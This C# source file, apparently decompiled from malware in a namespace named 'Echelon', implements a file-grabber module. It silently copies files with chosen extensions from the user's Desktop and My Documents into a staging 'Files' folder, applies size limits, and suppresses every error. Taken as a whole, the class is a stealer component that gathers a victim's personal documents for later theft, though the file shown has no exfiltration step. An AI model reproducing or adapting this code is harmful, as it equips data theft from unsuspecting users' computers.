using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;

namespace Echelon
{
	public class GetFiles
	{
		public class Folders : IFolders
		{
			[CompilerGenerated]
			private string a;

			[CompilerGenerated]
			private string b;

			public string Source
			{
				get;
				private set;
			}

			public string Target
			{
				get;
				private set;
			}

			public Folders(string source, string target)
			{
				Source = source;
				Target = target;
			}
		}

		public static int count;

		public static void Inizialize(string Echelon_Dir)
		{
			string text = Echelon_Dir + "\\Files";
			Directory.CreateDirectory(text);
			if (!Directory.Exists(text))
			{
				Inizialize(text);
				return;
			}
			CopyDirectory(Global.DesktopPath, text, "*.*", g.f);
			CopyDirectory(Global.MyDocuments, text, "*.*", g.f);
		}

		private static long a(string ii, long ij = 0L)
		{
			try
			{
				foreach (string item in Directory.EnumerateFiles(ii))
				{
					try
					{
						ij += new FileInfo(item).Length;
					}
					catch
					{
					}
				}
				foreach (string item2 in Directory.EnumerateDirectories(ii))
				{
					try
					{
						ij += a(item2, 0L);
					}
					catch
					{
					}
				}
				return ij;
			}
			catch
			{
				return ij;
			}
		}

		public static void CopyDirectory(string source, string target, string pattern, long maxSize)
		{
			Stack<Folders> stack = new Stack<Folders>();
			stack.Push(new Folders(source, target));
			long num = a(target, 0L);
			while (stack.Count > 0)
			{
				Folders folders = stack.Pop();
				try
				{
					Directory.CreateDirectory(folders.Target);
					foreach (string item in Directory.EnumerateFiles(folders.Source, pattern))
					{
						try
						{
							if (Array.IndexOf(g.g, Path.GetExtension(item).ToLower()) >= 0)
							{
								string text = Path.Combine(folders.Target, Path.GetFileName(item));
								if (new FileInfo(item).Length / 1024 < 5000)
								{
									File.Copy(item, text);
									num += new FileInfo(text).Length;
									if (num > maxSize)
									{
										return;
									}
									count++;
								}
							}
						}
						catch
						{
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
					continue;
				}
				catch (PathTooLongException)
				{
					continue;
				}
				try
				{
					foreach (string item2 in Directory.EnumerateDirectories(folders.Source))
					{
						try
						{
							if (!item2.Contains(Path.Combine(Global.DesktopPath, Environment.UserName)))
							{
								stack.Push(new Folders(item2, Path.Combine(folders.Target, Path.GetFileName(item2))));
							}
						}
						catch
						{
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch (DirectoryNotFoundException)
				{
				}
				catch (PathTooLongException)
				{
				}
			}
			stack.Clear();
		}
	}
}
